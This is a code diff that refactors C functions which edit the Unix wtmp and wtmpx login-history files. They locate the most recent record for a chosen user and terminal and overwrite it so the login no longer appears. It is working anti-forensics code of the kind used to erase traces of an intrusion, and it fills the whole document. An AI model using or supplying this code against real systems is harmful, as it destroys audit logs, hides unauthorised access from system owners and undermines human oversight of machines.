@@ -192,95 +192,63 @@ void wipe_utmpx(char *name, char *line)
 #endif
 }
 
-
-/*
- * WTMP editing.
- */
-#ifdef HAVE_UTMP
-void
-wipe_wtmp(char *who, char *line)
+void wipe_wtmp(char *name, char *line)
 {
-	int		fd1;
-	struct utmp	ut;
+#ifdef HAVE_UTMP
+	int fd;
+	struct utmp ut;
+	struct utmp new = { .ut_type = DEAD_PROCESS };
 
-	printf("Patching %s .... ", WTMP_FILE);
-	fflush(stdout);
-
-	/*
-	 * Open the wtmp file and temporary file.
-	 */
-	if ((fd1 = open(WTMP_FILE, O_RDWR)) < 0) {
+	if ((fd = open(WTMP_FILE, O_RDWR)) < 0) {
 		fprintf(stderr, "fatal: could not open %s: %m\n", WTMP_FILE);
 		return;
 	}
 
-	/*
-	 * Determine offset of last relevent entry.
-	 */
-	lseek(fd1, (long) -(sizeof(ut)), SEEK_END);
-	while ((read (fd1, &ut, sizeof(ut))) > 0) {
-		if (strncmp(ut.ut_name, who, strlen(who)) != 0)
+	lseek(fd, -sizeof(ut), SEEK_END);
+	while ((read (fd, &ut, sizeof(ut))) > 0) {
+		if (name && strncmp(ut.ut_name, name, sizeof(ut.ut_name)))
 			goto skip;
-		if (line && strncmp(ut.ut_line, line, strlen(line)) != 0)
+		if (line && strncmp(ut.ut_line, line, sizeof(ut.ut_line)))
 			goto skip;
-		bzero((char *) &ut, sizeof(ut));
-		lseek(fd1, (long) -(sizeof(ut)), SEEK_CUR);
-		write(fd1, &ut, sizeof(ut));
+		lseek(fd, -sizeof(ut), SEEK_CUR);
+		write(fd, &new, sizeof(ut));
 		break;
 skip:
-		lseek(fd1, (long) -(sizeof(ut) * 2), SEEK_CUR);
+		lseek(fd, -(sizeof(ut) * 2), SEEK_CUR);
 	}
 
-	close(fd1);
-
-	printf("Done.\n");
-}
+	close(fd);
 #endif
+}
 
-
-/*
- * WTMPX editing if supported.
- */
-#ifdef HAVE_UTMPX
-void
-wipe_wtmpx(char *who, char *line)
+void wipe_wtmpx(char *name, char *line)
 {
-	int 		fd1;
-	struct utmpx	utx;
+#ifdef HAVE_UTMPX
+	int fd;
+	struct utmpx utx;
+	struct utmpx new = { .ut_type = DEAD_PROCESS };
 
-	printf("Patching %s .... ", WTMPX_FILE);
-	fflush(stdout);
-
-	/*
-	 * Open the utmp file and temporary file.
-	 */
-	if ((fd1 = open(WTMPX_FILE, O_RDWR)) < 0) {
+	if ((fd = open(WTMPX_FILE, O_RDWR)) < 0) {
 		fprintf(stderr, "fatal: could not open %s: %m\n", WTMPX_FILE);
 		return;
 	}
 
-	/*
-	 * Determine offset of last relevent entry.
-	 */
-	lseek(fd1, (long) -(sizeof(utx)), SEEK_END);
-	while ((read(fd1, &utx, sizeof(utx))) > 0) {
-		if (!strncmp(utx.ut_name, who, strlen(who)))
+	lseek(fd, -sizeof(utx), SEEK_END);
+	while ((read(fd, &utx, sizeof(utx))) > 0) {
+		if (name && strncmp(utx.ut_name, name, sizeof(utx.ut_name)))
 			goto skip;
-		if (line && strncmp(utx.ut_line, line, strlen(line)) != 0)
+		if (line && strncmp(utx.ut_line, line, sizeof(utx.ut_line)))
 			goto skip;
-		bzero((char *) &utx, sizeof(utx));
-		lseek(fd1, (long) -(sizeof(utx)), SEEK_CUR);
-		write(fd1, &utx, sizeof(utx));
+		lseek(fd, -sizeof(utx), SEEK_CUR);
+		write(fd, &new, sizeof(utx));
 		break;
 skip:
-		lseek(fd1, (int) -(sizeof(utx) * 2), SEEK_CUR);
+		lseek(fd, -(sizeof(utx) * 2), SEEK_CUR);
 	}
 
-	close(fd1);
-
-	printf("Done.\n");
-}
+	close(fd);
 #endif
+}
 
 
 /*
